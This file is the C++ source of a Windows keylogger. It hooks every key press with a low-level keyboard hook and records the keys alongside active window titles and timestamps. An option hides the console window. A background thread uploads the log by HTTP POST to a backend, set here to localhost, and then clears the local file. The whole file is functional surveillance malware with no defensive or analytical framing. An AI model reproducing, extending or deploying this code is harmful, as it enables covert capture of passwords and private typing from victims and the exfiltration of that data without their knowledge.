#define UNICODE
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>
#include <string>
#include <thread>
#include <chrono>   
#include <vector>

using namespace std;

// Configurations
#define FORMAT 0        // 0 = labels, 10 = decimal, 16 = hex
#define VISIBLE       // INVISIBLE or VISIBLE
#define BOOT_WAIT       // BOOT_WAIT or NOWAIT
#define MOUSE_IGNORE    // ignore mouse clicks

const char* serverName = "localhost";
const char* resource = "/";
const int intervalMinutes = 20;  // Every 1 minute
const string log_file_name = "keylogger.log";
const int BACKEND_PORT = 8000;

#if FORMAT == 0
const map<int, string> keyLabels{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"}, {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"}, {VK_MENU, "[ALT]"}, {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"}, {VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"},
    {VK_HOME, "[HOME]"}, {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}, {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}, {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}, {VK_ADD, "+"},
    {VK_SUBTRACT, "-"}, {VK_CAPITAL, "[CAPSLOCK]"}
};
#endif

class Keylogger {
private:
    HHOOK hookHandle;
    ofstream logFile;
    char lastWindow[256]{};

public:
    Keylogger(const string& filename) {
        logFile.open(filename, ios_base::app);
        hookHandle = nullptr;
        memset(lastWindow, 0, sizeof(lastWindow));
    }

    ~Keylogger() {
        RemoveHook();
        if (logFile.is_open()) logFile.close();
    }

    void InstallHook() {
        hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);
        if (!hookHandle) {
            MessageBox(nullptr, L"Failed to install hook!", L"Error", MB_ICONERROR);
        }
    }

    void RemoveHook() {
        if (hookHandle) {
            UnhookWindowsHookEx(hookHandle);
            hookHandle = nullptr;
        }
    }

    void Run() {
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {}
    }

    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbData = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            GetInstance().LogKeystroke(kbData->vkCode);
        }
        return CallNextHookEx(GetInstance().hookHandle, nCode, wParam, lParam);
    }

    void LogKeystroke(int vkCode) {
#ifdef MOUSE_IGNORE
        if (vkCode == 1 || vkCode == 2) return;
#endif

        HWND activeWindow = GetForegroundWindow();
        DWORD threadId = 0;
        HKL keyboardLayout = nullptr;

        if (activeWindow) {
            threadId = GetWindowThreadProcessId(activeWindow, nullptr);
            keyboardLayout = GetKeyboardLayout(threadId);

            char windowTitle[256];
            GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));

            if (strcmp(windowTitle, lastWindow) != 0) {
                strcpy(lastWindow, windowTitle);

                // Timestamp
                time_t t = time(nullptr);
                struct tm timeInfo;
                struct tm* timeInfoPtr = localtime(&t);
                if (timeInfoPtr) {
                    timeInfo = *timeInfoPtr;
                }

                char timeStr[64];
                strftime(timeStr, sizeof(timeStr), "%FT%X%z", &timeInfo);

                logFile << "\n\n[Window: " << windowTitle << " - at " << timeStr << "] ";
            }
        }

        stringstream output;

#if FORMAT == 10
        output << '[' << vkCode << ']';
#elif FORMAT == 16
        output << hex << "[" << vkCode << ']';
#else
        if (keyLabels.count(vkCode)) {
            output << keyLabels.at(vkCode);
        } else {
            char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
            bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
            if (!isLowercase) ch = tolower(ch);

            output << ch;
        }
#endif

        logFile << output.str();
        logFile.flush();
    }

    static void SetConsoleVisibility() {
#ifdef INVISIBLE
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
        FreeConsole();
#endif
#ifdef VISIBLE
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
#endif
    }

    static bool IsSystemBooting() {
        // Replace with better check if needed
        return false;
    }

    static Keylogger& GetInstance() {
        static Keylogger instance("keylogger.log");
        return instance;
    }
};

string getUserName(){
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    
    if (GetComputerNameA(computerName, &size)) {
        return computerName;
        // cout << "Computer Name: " << computerName << std::endl;
    } 
    return ""; 
}

// Function to simulate backend call (here just printing to console)
void sendLogsToBackend() {
    ifstream logFile(log_file_name);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file.\n";
        return;
    }

    // Extract the logs from file
    string logs((istreambuf_iterator<char>(logFile)), istreambuf_iterator<char>());
    logFile.close();

    // No logs => No need to make backend request, just return!
    if (logs.empty()) {
        std::cout << "Log file is empty. Skipping upload.\n";
        return;
    }

    HINTERNET hSession = InternetOpenA("LogUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "Failed to open Internet session.\n";
        return;
    }

    HINTERNET hConnect = InternetConnectA(hSession, serverName, BACKEND_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "Failed to connect to server.\n";
        InternetCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        std::cerr << "Failed to open HTTP request.\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    std::string body = "{\"logs\":\"" + logs + "\"}";
    std::string headers = "Content-Type: application/json\r\n";

    BOOL bRequestSent = HttpSendRequestA(
        hRequest,
        headers.c_str(),
        headers.length(),
        (LPVOID)body.c_str(),
        body.size()
    );
    cout<<typeid(body).name()<<endl;
    cout<<body<<endl;

    if (!bRequestSent) {
        std::cerr << "Failed to send HTTP request.\n";
        cout<<bRequestSent<<endl;
    } else {
        char responseBuffer[4096] = { 0 };
        DWORD bytesRead = 0;

        BOOL bRead = InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead);
        if (bRead && bytesRead > 0) {
            responseBuffer[bytesRead] = '\0';
            string response(responseBuffer);

            cout << "Server response: " << response << std::endl;

            // Trim whitespaces (optional)
            response.erase(0, response.find_first_not_of(" \t\n\r"));
            response.erase(response.find_last_not_of(" \t\n\r") + 1);

            if (response == "{\"success\":true}") {
                std::ofstream clearFile(log_file_name, std::ios::out | std::ios::trunc);
                clearFile.close();
                std::cout << "Logs cleared after successful upload.\n";
            } else {
                std::cerr << "Upload failed. Server response not {\"success\":true}.\n";
            }
        } else {
            std::cerr << "Failed to read server response.\n";
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

// Background worker that runs every X minutes
void scheduleBackendCalls(int intervalSeconds) {
    while (true) {
        this_thread::sleep_for(chrono::seconds(intervalSeconds));
        sendLogsToBackend();
    }
}

int main() {
    string compName = getUserName();
    cout<<compName;
    
    // Start the backend call thread (runs every 10 seconds for demo)
    std::thread schedulerThread(scheduleBackendCalls, 10);
    schedulerThread.detach(); // Run it independently

    Keylogger::SetConsoleVisibility();

#ifdef BOOT_WAIT
    while (Keylogger::IsSystemBooting()) {
        Sleep(10000);
    }
#endif

    Keylogger& logger = Keylogger::GetInstance();
    logger.InstallHook();
    logger.Run();

}
